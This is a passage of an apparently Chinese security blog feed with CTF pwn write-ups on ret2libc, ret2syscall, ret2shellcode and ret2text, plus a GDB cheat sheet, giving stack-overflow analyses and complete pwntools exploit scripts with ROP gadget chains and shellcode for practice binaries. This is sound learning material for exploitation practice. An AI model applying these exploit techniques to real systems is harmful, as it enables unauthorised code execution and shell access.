title="目的："></a>目的：</h2><ol><li>找system函数地址</li><li>找<code>/bin/sh</code>字符串地址</li></ol><blockquote><p>拓展:</p><p>system函数属于libc,而libc.so动态链接库中的函数之间相对偏移是固定的.</p><p>即使程序开启ASLR保护,也只是针对地址中间位进行随机,最低的12位并不会发生改变</p><p>libc归纳:<a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></p></blockquote><p>通过确定libc中某个函数的地址,确定该程序利用的libc版本,进而确定system函数的地址.</p><p>利用got表泄露,输出某个函数对应的got表项的内容 (由于libc延迟绑定机制,需要泄露已经执行过的函数地址)</p><h2 id="libc的延迟绑定"><a href="#libc的延迟绑定" class="headerlink" title="libc的延迟绑定"></a>libc的延迟绑定</h2><p>动态链接的程序是在运行时需要对全局和静态数据访问进行GOT定位,然后间接寻址.对于模块间的调用也需要GOT定位,再间接跳转,这么做会影响程序运行速度,因此ELF采用当函数第一次使用时才进行绑定的思想,即延迟绑定.</p><p>ELF实现延迟绑定,是通过plt,原先got中存放着全局变量和函数调用,现在拆分为另一个部分.got和.got.plt,用.got存放着全局变量引用,用.got.plt存放着函数引用.</p><p>一个函数被调用过以后,got表里保存了它在内存中的地址,可以通过泄露got表内存来泄露函数地址,就可以根据其与libc中该函数的偏移计算其他函数在内存空间中的地址,因为libc中任意两个函数之间的偏移是固定的.</p><p>例: 计算system函数在内存空间中的地址</p><ul><li>拿到<code>__libc_start_main</code>函数在内存空间中的地址addr_main</li><li><code>__libc_start_main</code>函数相对于libc.so.6的起始地址是addr_a</li><li>system函数相对于libc.so.6的起始地址是addr_b</li><li>则system函数在内存中1真正的地址是<code>addr_main+addr_b-addr_a</code></li></ul><p><img src="https://s2.loli.net/2023/01/09/NBLb4ZKUnm3rYWx.png" alt="image.png"></p><p>使用libc的利用工具LibcSearcher: </p><p><a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a></p><h2 id="基本利用思路"><a href="#基本利用思路" class="headerlink" title="基本利用思路"></a>基本利用思路</h2><p>在plt表中发现puts函数:</p><p><img src="https://s2.loli.net/2023/01/09/H5KwpT8mtWnkA2r.png" alt="image.png"></p><ul><li>利用栈溢出及puts函数泄露出在got表<code>__libc_start_main</code>函数的地址(也可以其他函数)</li><li>puts函数的返回地址为<code>_start</code>函数或main函数</li><li>即使程序有ASLR保护,也只是针对地址中间位进行随机,最低12位并不会改变,所以可以根据泄露判断libc的版本</li><li>利用泄露出的函数地址的最低12位计算system函数和<code>/bin/sh</code>字符串的内存地址</li><li>利用构造payload</li></ul><p><img src="https://s2.loli.net/2023/01/09/J3WPtBzaGIgkr28.png" alt="image.png"></p><p><img src="https://s2.loli.net/2023/01/09/c8fix65NSOUkJWu.png" alt="image.png"></p><pre><code class="hljs">__libc_start_main函数在got表的地址:0x0804A024_start函数地址: 0x080484D0puts函数在plt表中的地址: 0x08048460</code></pre><p>看不懂,先摆烂了</p><p><a href="https://www.cnblogs.com/Tsuiyields/p/11963790.html">https://www.cnblogs.com/Tsuiyields/p/11963790.html</a></p><p><a href="https://blog.csdn.net/acsuccess/article/details/104335514">https://blog.csdn.net/acsuccess/article/details/104335514</a></p><p><a href="https://libc.blukat.me/?q=__libc_start_main_ret:e81">https://libc.blukat.me/?q=__libc_start_main_ret%3Ae81</a></p><p><a href="https://www.jianshu.com/p/df8645e63365">https://www.jianshu.com/p/df8645e63365</a></p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h3 id="main函数与-start函数区别"><a href="#main函数与-start函数区别" class="headerlink" title="main函数与_start函数区别"></a>main函数与_start函数区别</h3><ul><li><code>main()</code>是用户代码的入口.</li><li><code>__start()</code>是系统代码入口</li></ul><p><code>_start</code>函数比main函数多了一个堆栈平衡(栈对齐)操作:</p><p><code>_start</code>函数中有依据<code>ans esp,0FFFFFFF0h</code>进行了堆栈平衡,在and语句之前,esp为0xffffade8,经过and之后,esp变为0xffffade0,所以问题就出在<code>_start</code>函数的and语句,若直接返回main函数就相当于少了一个and操作,esp位置也就多了8(栈内存增长相反,即栈空间少了8)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;程序下载：&lt;a href=&quot;https://pan.baidu.com/s/1rrz6u-w_TlmQcdQrU_rZlw&quot;&gt;https://pan.baidu.com/s/1rrz6u-w_TlmQcdQrU_rZlw &lt;/a&gt;&lt;br&gt;提取码：rc47&lt;/p&gt;
&lt;h1 i</summary>
      
    
    
    
    
    <category term="ROP" scheme="https://sinky.top/tags/ROP/"/>
    
    <category term="栈溢出" scheme="https://sinky.top/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="CTFWikiPWN" scheme="https://sinky.top/tags/CTFWikiPWN/"/>
    
  </entry>
  
  <entry>
    <title>基本ROP之ret2syscall</title>
    <link href="https://sinky.top/2022/12/08/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2syscall/"/>
    <id>https://sinky.top/2022/12/08/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2syscall/</id>
    <published>2022-12-08T08:41:15.987Z</published>
    <updated>2023-01-09T01:21:23.190Z</updated>
    
    <content type="html"><![CDATA[<p>程序下载：<br><a href="https://pan.baidu.com/s/1gXkrC0w56yH-FdTkUjFttw">https://pan.baidu.com/s/1gXkrC0w56yH-FdTkUjFttw </a><br>提取码：ch1e</p><h1 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h1><p>原理：控制程序执行系统调用，获取shell</p><p><img src="https://s2.loli.net/2022/12/09/8CNOQ4Je79hujfr.png" alt="image.png"></p><p>checksec查看，32位，got表可写，没开栈保护和地址随机化，开了NX（不可执行）</p><p>IDA查看：</p><p>main函数：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"This time, no system() and NO SHELLCODE!!!"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"What do you plan to do?"</span>);<br>  <span class="hljs-built_in">gets</span>(&amp;v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>gets()函数，栈溢出漏洞标志！</p><p>看见字符串有后门：<code>/bin/sh = 0x080be408</code></p><p>套路：先看变量v4的地址，然后再找ebp地址，计算出偏移量，然后垃圾数据覆盖溢出到后门函数那边。</p><p>本来我找了v4地址，看IDA是根据esp去索引的，想当然的就套公式，找esp找ebp算出偏移，但是错了，看了一下参考文章发现，linux系统调用跟eax有关：</p><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>linux的系统调用通过<code>int 80h</code>实现，用系统调用号来区分入口函数，操作系统实现系统调用的基本过程：</p><ul><li>应用程序调用库函数(API)：</li><li>API将系统调用号存入eax，通过中断调用使系统进入内核态；</li><li>内核中的中断处理函数根据系统调用号，调用对应的内核函数(系统调用)；</li><li>系统调用完成相应功能，将返回值存入eax，返回到中断处理函数；</li><li>中断处理函数返回到API中；</li><li>PI将eax返回给应用程序</li></ul><p>应用程序调用系统调用的过程：</p><ul><li>将系统调用的编号存入eax</li><li>将函数参数存入其他通用寄存器</li><li>最后<code>int 0x80</code></li></ul><p>寄存器执行顺序：</p><ul><li>32位：eax-&gt; ebx-&gt; ecx-&gt; edx</li><li>64位：rdi-&gt; rsi-&gt; rcx-&gt; r8-&gt; r9</li></ul><p>言归正传，所以此题的偏移量应为<code>ebp-eax</code></p><p><img src="https://s2.loli.net/2022/12/09/2ktGcJr9eInwBCS.png" alt="image.png"></p><pre><code class="hljs">EAX: 0xffffd4acEBP: 0xffffd518偏移量：0x6C + 4 = 112</code></pre><p>根据那个应用程序调用系统调用的顺序，也就是说我们将对应获取shell的系统调用参数，放到对应寄存器中，最后执行<code>int 0x80</code>就可以执行对应的系统调用了。</p><p>32位执行时，eax参数为系统调用号，ebx指向<code>/bin/sh</code>地址，ecx参数为0，edx参数也为0</p><p>即<code>execve('/bin/sh',NULL,NULL)</code></p><ul><li>execve() 函数是用来执行<code>/bin/sh</code>路径的</li></ul><p>参考文章：<a href="https://blog.csdn.net/qq742762377/article/details/84325369">https://blog.csdn.net/qq742762377/article/details/84325369</a></p><p>整理一下：</p><pre><code class="hljs">eax：0xbebx: /bin/shecx: 0edx: 0偏移：112</code></pre><p>控制寄存器的值可以使用gadgets,通常情况下无法保证程序中有一段连续的代码可以同时控制对应寄存器，因此需要一段一段的控制，gadgets最后使用ret来再次控制程序执行流程。</p><p>通过ropgedgets工具寻找gadgets.</p><p>ropgedgets的安装利用：<a href="https://www.wangan.com/docs/678">https://www.wangan.com/docs/678</a></p><p>找控制eax的gadgets:</p><pre><code class="hljs">ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'</code></pre><p><img src="https://s2.loli.net/2022/12/09/Ge6bnlydJzkWuC8.png" alt="image.png"></p><p>以上都能使用，我用第二行：</p><pre><code class="hljs">0x080bb196 : pop eax ; ret</code></pre><p>找控制ebx的gadgets:</p><pre><code class="hljs">ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'</code></pre><p><img src="https://s2.loli.net/2022/12/09/XU4NFbixWA79hHS.png" alt="image.png"></p><p>我用：</p><pre><code class="hljs">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code></pre><p>能控制ebx,ecx,edx,都能控制，省事儿。</p><p>也可以用ropgadget找<code>/bin/sh</code>:</p><pre><code class="hljs">ROPgadget --binary rop  --string '/bin/sh'</code></pre><p>反正上面我IDA也找到了。</p><pre><code class="hljs">int 0x80的地址：ROPgadget --binary rop  --only 'int'</code></pre><p><img src="https://s2.loli.net/2022/12/09/Ju6MADH1cINFbmP.png" alt="image.png"></p><pre><code class="hljs">int 0x80: 0x08049421</code></pre><p>那么payload:</p><pre><code class="hljs">payload='a'*112+p32(pop_eax_addr)+p32(0xb)+p32(pop_edx_ecx_ebx_addr)+p32(0)+p32(0)+p32(bin_addr)+p32(int_addr)</code></pre><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><pre><code class="hljs">from pwn import *p=process('./rop')pop_eax_addr=0x080bb196pop_edx_ecx_ebx_addr=0x0806eb90bin_addr=0x080be408int_addr=0x08049421payload='a'*112+p32(pop_eax_addr)+p32(0xb)+p32(pop_edx_ecx_ebx_addr)+p32(0)+p32(0)+p32(bin_addr)+p32(int_addr)p.sendline(payload)p.interactive()</code></pre><p><img src="https://s2.loli.net/2022/12/09/kmuOz9LMnvGpIF2.png" alt="image.png"></p><p>成功！！</p><p>看到有的exp里直接用一个flat()把p32()转换这直接简便了，我也贴一下吧：</p><pre><code class="hljs">payload&nbsp;=&nbsp;flat(["A"*112,pop_eax_addr,0xb,pop_edx_ecx_ebx_addr,0,0,bin_addr,int_addr])</code></pre><blockquote><p>注：如果程序中没有<code>/bin/sh</code>，就调用read()函数将<code>/bin/sh</code>写入bss段，然后再使用execve()</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;程序下载：&lt;br&gt;&lt;a href=&quot;https://pan.baidu.com/s/1gXkrC0w56yH-FdTkUjFttw&quot;&gt;https://pan.baidu.com/s/1gXkrC0w56yH-FdTkUjFttw &lt;/a&gt;&lt;br&gt;提取码：ch1e&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="ROP" scheme="https://sinky.top/tags/ROP/"/>
    
    <category term="栈溢出" scheme="https://sinky.top/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="CTFWikiPWN" scheme="https://sinky.top/tags/CTFWikiPWN/"/>
    
  </entry>
  
  <entry>
    <title>基本ROP之ret2shellcode</title>
    <link href="https://sinky.top/2022/12/07/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2shellcode/"/>
    <id>https://sinky.top/2022/12/07/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2shellcode/</id>
    <published>2022-12-07T08:44:02.905Z</published>
    <updated>2022-12-08T08:30:17.638Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>ret2shellcode,即控制程序执行shellcode代码，shellcode指用于完成某个功能的汇编代码，常见功能主要是获取目标系统的shell,一般来说shellcode需要自己填充。</p><p>控制程序执行shellcode。在栈溢出的基础上，若想在执行shellcode,需要对应的binary在运行时shellcode所在的区域具有可执行权限。</p><p>下载程序：</p><p><a href="https://pan.baidu.com/s/1VR8Ei39cozSaIjZa3laHkQ">https://pan.baidu.com/s/1VR8Ei39cozSaIjZa3laHkQ </a><br>提取码：r94f</p><h1 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h1><p>checksec查看保护：</p><p><img src="https://s2.loli.net/2022/12/08/vDUj3E2pV7l6QAJ.png" alt="image.png"></p><p>32位，啥都没开。含有RWX段（可读可写可执行）</p><p>IDA看一下：</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs scss">int __cdecl <span class="hljs-selector-tag">main</span>(int argc, const char **argv, const char **envp)<br>{<br>  char s<span class="hljs-selector-attr">[100]</span>; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>("No system for you this time !!!");<br>  <span class="hljs-built_in">gets</span>(s);<br>  <span class="hljs-built_in">strncpy</span>(buf2, s, <span class="hljs-number">0</span>x64u);<br>  <span class="hljs-built_in">printf</span>("bye bye ~");<br>  return <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>存在strncpy函数，栈溢出漏洞，将对应字符串s复制到buf2处。buf2在bss段：</p><p><img src="https://s2.loli.net/2022/12/08/gMj8EZsni9acCJu.png" alt="image.png"></p><p>buf2地址：<code>0x0804A080</code></p><p>查看call调用位置：</p><p><img src="https://s2.loli.net/2022/12/08/ekNcTuOyb2lp1x4.png" alt="image.png"></p><p>gdb在此处断点：</p><pre><code class="hljs">b *0x080485AF</code></pre><p><img src="https://s2.loli.net/2022/12/08/ISxJMn6FzAqTdLD.png" alt="image.png"></p><p>字符串地址：<code>0xffffd48c</code></p><p>ebp地址：<code>0xffffd4f8</code></p><pre><code class="hljs">0xffffd4f8 - 0xffffd48c = 0x6C</code></pre><p>偏移量：<code>0x6c+4</code></p><p>程序将s复制到buf2处，且buf2在bss段，在main处断点调试程序，运行之后利用vmmap查看。</p><ul><li>vmmap 用于查看程序各种段的地址和范围</li></ul><p><img src="https://s2.loli.net/2022/12/08/4GmfaT2AFNRLcSw.png" alt="image.png"></p><p>发现可执行bss段：</p><pre><code class="hljs">0x0804a000 0x0804b000 rwxp…/pwn_soft/ret2shellcode</code></pre><p>我们可以控制程序执行bss段处的shellcode</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>gets函数将获得内容复制给buf2数组，buf2未在main内定义，是未初始化的全局变量，且在.bss段，可以通过shellcraft.sh()函数，创造一个shell，将其写入buf2，通过栈溢出，将函数的返回地址覆盖为shell地址，即可获取shell。</p><ul><li><code>asm(shellcraft.sh())</code>  产生一个32位shell</li><li><code>asm(shellcraft.amd64.sh())</code> 产生一个64位shel</li><li><code>context(os=’linux’, arch=’amd64’, log_level=’debug’)</code><ul><li>os设置系统为linux系统,大多数pwn题目的系统都是linux</li><li>arch设置为amd64，可以简单的认为设置为64位的模式，对应的32位模式是i386</li><li>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，将完整的io过程打印下来，方便调试.</li></ul></li></ul><p>信息：</p><pre><code class="hljs">buf2_addr = 0x0804A080偏移量：0x6c + 4 = 112</code></pre><p>exp:</p><pre><code class="hljs">from pwn import *p=process('./ret2shellcode')shell=asm(shellcraft.sh())buf2_addr=0x0804A080payload=shell.ljust(112,b'A')+p32(buf2_addr)p.sendline(payload)p.interactive()</code></pre><ul><li><code>shell.ljust(112,b'A')</code> 表示从机器码后方添加是数据直到总长112字节</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;ret2shellcode,即控制程序执行shellcode代码，shellcode指用于完成某个功能的汇编代码，常见功能主要是获取目标系统</summary>
      
    
    
    
    
    <category term="ROP" scheme="https://sinky.top/tags/ROP/"/>
    
    <category term="栈溢出" scheme="https://sinky.top/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="CTFWikiPWN" scheme="https://sinky.top/tags/CTFWikiPWN/"/>
    
  </entry>
  
  <entry>
    <title>GDB利用技巧</title>
    <link href="https://sinky.top/2022/12/07/GDB%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <id>https://sinky.top/2022/12/07/GDB%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/</id>
    <published>2022-12-07T07:33:09.644Z</published>
    <updated>2022-12-08T08:06:05.528Z</updated>
    
    <content type="html"><![CDATA[<h1 id="下断点"><a href="#下断点" class="headerlink" title="下断点"></a>下断点</h1><p>在源文件函数入口处断点：</p><pre><code class="hljs">b 文件名:函数名b text.c:func1</code></pre><p>在源文件某一行断点：</p><pre><code class="hljs">b 代码行号例：b 7</code></pre><p>在程序的某个地址断点：</p><pre><code class="hljs">b *address例：b 0x401000</code></pre><p>条件断点：</p><pre><code class="hljs">b num if cond例：b 14 if c=4</code></pre><p>查看断点：</p><pre><code class="hljs">info b</code></pre><p>删除断点：</p><pre><code class="hljs">del num[断点序号]</code></pre><p>设置断点有效和无效：</p><pre><code class="hljs">dis num # 将第num个断点设置为无效ena num # 将第num个断点设置为有效</code></pre><h1 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h1><pre><code class="hljs">查看代码：l # 显示十行代码l 15 # 显示十五行代码l main # 显示main函数info source # 查看当前程序info r # 查看所有寄存器值info r 寄存器名 # c查看某一寄存器值</code></pre><h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>程序从main函数开始：</p><pre><code class="hljs">run</code></pre><p>运行到第一个断点处：</p><pre><code class="hljs">start</code></pre><h1 id="执行流控制"><a href="#执行流控制" class="headerlink" title="执行流控制"></a>执行流控制</h1><pre><code class="hljs">c/continue # 向下运行到下一个断点处n/next # 单步步过，执行下一行代码，不进入调用的函数，直接返回结果s/step # 单步步入finish # 跳出函数体until # 跳出当前循环，在执行完循环体内最后一句之后执行until，才可以跳出循环j/jump # 跳转到指定行/地址后继续执行，若无断点则继续执行stop # 停止运行quit # 退出gdb</code></pre><h1 id="打印"><a href="#打印" class="headerlink" title="打印"></a>打印</h1><pre><code class="hljs">p var # 打印变量值ptype var # 打印变量类型p &amp;var # 打印变量地址p *addr # 打印地址的值p /x var # 用十六禁止显示数据info args # 打印到当前函数参数值info locals # 打印当前函数中所有局部变量值</code></pre><h1 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h1><ul><li>vmmap 用于查看程序各种段的地址和范围</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;下断点&quot;&gt;&lt;a href=&quot;#下断点&quot; class=&quot;headerlink&quot; title=&quot;下断点&quot;&gt;&lt;/a&gt;下断点&lt;/h1&gt;&lt;p&gt;在源文件函数入口处断点：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;hljs&quot;&gt;b 文件名:函数名
b text.c:func1
</summary>
      
    
    
    
    
    <category term="GDB" scheme="https://sinky.top/tags/GDB/"/>
    
  </entry>
  
  <entry>
    <title>基本ROP之ret2text</title>
    <link href="https://sinky.top/2022/12/07/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2text/"/>
    <id>https://sinky.top/2022/12/07/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2text/</id>
    <published>2022-12-07T05:39:07.931Z</published>
    <updated>2022-12-07T13:44:56.324Z</updated>
    
    <content type="html"><![CDATA[<p>访问不了github，改了host,也试过改DNS都不行，抓狂浪费时间，最后果断选择翻一下下载了这个程序。</p><p>自行下载：</p><p><a href="https://pan.baidu.com/s/1Wq6z-hpkBkZESn14Q9jHtw">https://pan.baidu.com/s/1Wq6z-hpkBkZESn14Q9jHtw</a></p><p>提取码：v4gi</p><p>跟着CTFWikiPWN一起做一遍：</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3" title="CTFWikiPWN">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3</a></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>reet2text即控制程序本身已有的代码(.text)</p><p><img src="https://s2.loli.net/2022/12/07/GPTQWzslnur8YcU.png" alt="image.png"></p><p>32位，got表可写，没开栈保护和地址随机，开了NX(栈不可以执行保护),可以考虑rop绕过。</p><p>main函数：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"There is something amazing here, do you know anything?"</span>);<br>  <span class="hljs-built_in">gets</span>(s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Maybe I will tell you next time !"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>存在gets函数，栈溢出漏洞</p><p>找一下有没有后门函数：</p><p><img src="https://s2.loli.net/2022/12/07/EBqIiSLzMycNbZJ.png" alt="image.png"></p><p><code>/bin/sh</code>地址：0x0804863A</p><p>控制程序返回0x0804863A就可以拿到shell.</p><h1 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h1><p>先看一下变量s：</p><p><img src="https://s2.loli.net/2022/12/07/GDcKFTvPhAo2j7W.png" alt="image.png"></p><p>先确定能够控制的内存起始地址距离main函数返回地址的字节数。</p><p>如上图，该字符串通过esp进行索引。</p><p>进入gdb：</p><pre><code class="hljs">b *0x080486AEr</code></pre><p>在call处下断点，运行,查看esp和ebp</p><p><img src="https://s2.loli.net/2022/12/07/9YyXFofLGH1iQsk.png" alt="image.png"></p><p>esp: 0xffffd480</p><p>ebp: 0xffffd508</p><p>根据代码</p><p><img src="https://s2.loli.net/2022/12/07/AZtbInzKYoFxVBP.png" alt="image.png"></p><p>(R一下就会变成1C了)</p><p>可知，s相对于esp的索引为<code>esp+1C</code></p><p>则s地址为：</p><pre><code class="hljs">0xffffd480 + 0x1C = 0xffffd49c</code></pre><p>s相对于ebp的偏移为：</p><pre><code class="hljs">0xffffd508 - 0xffffd49c = 0x6C</code></pre><p>s相对于返回地址的偏移为：</p><pre><code class="hljs">0x6C+4</code></pre><p>所以：</p><pre><code class="hljs">payload='a'*0x6C+'b'*4+p32(0x0804863A)</code></pre><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><pre><code class="hljs">from pwn import *p=process('./ret2text')sys=0x0804863apayload='a'*0x6C+'b'*4+p32(sys)p.sendlines(payload)p.interactive()</code></pre><p><img src="https://s2.loli.net/2022/12/07/6hJBfwvXo9ky23P.png" alt="image.png"></p><p>呜呜呜感觉终于对pwn稍微稍微的有了那么一点点头绪哭了哭了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;访问不了github，改了host,也试过改DNS都不行，抓狂浪费时间，最后果断选择翻一下下载了这个程序。&lt;/p&gt;
&lt;p&gt;自行下载：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://pan.baidu.com/s/1Wq6z-hpkBkZESn14Q9jHtw&quot;&gt;https</summary>
      
    
    
    
    
    <category term="ROP" scheme="https://sinky.top/tags/ROP/"/>
    
    <category term="栈溢出" scheme="https://sinky.top/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="CTFWikiPWN" scheme="https://sinky.top/tags/CTFWikiPWN/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界 PWN-200</title>
    <link href="https://sinky.top/2022/12/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-PWN-200(%E5%BE%85%E8%A1%A5%E5%85%85)/"/>
    <id>https://sinky.top/2022/12/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-PWN-200(%E5%BE%85%E8%A1%A5%E5%85%85)/</id>
    <published>2022-12-05T05:35:39.929Z</published>
    <updated>2022-12-06T07:36:35.793Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>拿到题目先查一下保护：</p><p><img src="https://s2.loli.net/2022/12/05/YHz4qNbSylvX3dI.png" alt="image.png"></p><p>32位，没开栈保护和PIE；开了NX,可不执行内存可以用rop；</p><p>Partial RELRO - got表可写</p><p>扔进IDA看一下：</p><p>主函数：</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">int __cdecl <span class="hljs-selector-tag">main</span>()<br>{<br>  char buf<span class="hljs-selector-attr">[108]</span>; <span class="hljs-comment">// [esp+2Ch] [ebp-6Ch] BYREF</span><br>  <span class="hljs-built_in">strcpy</span>(buf, "Welcome to XDCTF2015~!\n");<br>  <span class="hljs-built_in">memset</span>(&amp;buf[<span class="hljs-number">24</span>], <span class="hljs-number">0</span>, <span class="hljs-number">0</span>x4Cu);<br>  <span class="hljs-built_in">setbuf</span>(stdout, buf);<br>  <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, buf, strlen(buf));<br>  <span class="hljs-built_in">sub_8048484</span>();<br>  return <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>sub_8048484()函数：</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">ssize_t <span class="hljs-built_in">sub_8048484</span>()<br>{<br>  char buf<span class="hljs-selector-attr">[108]</span>; <span class="hljs-comment">// [esp+1Ch] [ebp-6Ch] BYREF</span><br>  <span class="hljs-built_in">setbuf</span>(stdin, buf);<br>  return <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0</span>x100u);<br>}<br></code></pre></td></tr></tbody></table></figure><p>此处存在栈溢出，buf最多只有6Ch,但read读入了0x100的大小。</p><h1 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h1><ol><li>有read(),write(),无system()</li><li>在函数sub_8048484()中存在栈溢出</li></ol><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ol><li>通过栈溢出调用write()函数泄露write()对应的got表内容，此处将write()函数的返回地址设置为main或sub_8048484()的地址以便再次利用栈溢出漏洞</li><li>通过LibcSearcher获取libc版本</li><li>获取system函数，<code>'/bin/sh'</code>地址</li><li>再次利用栈溢出漏洞执行system函数</li></ol><h2 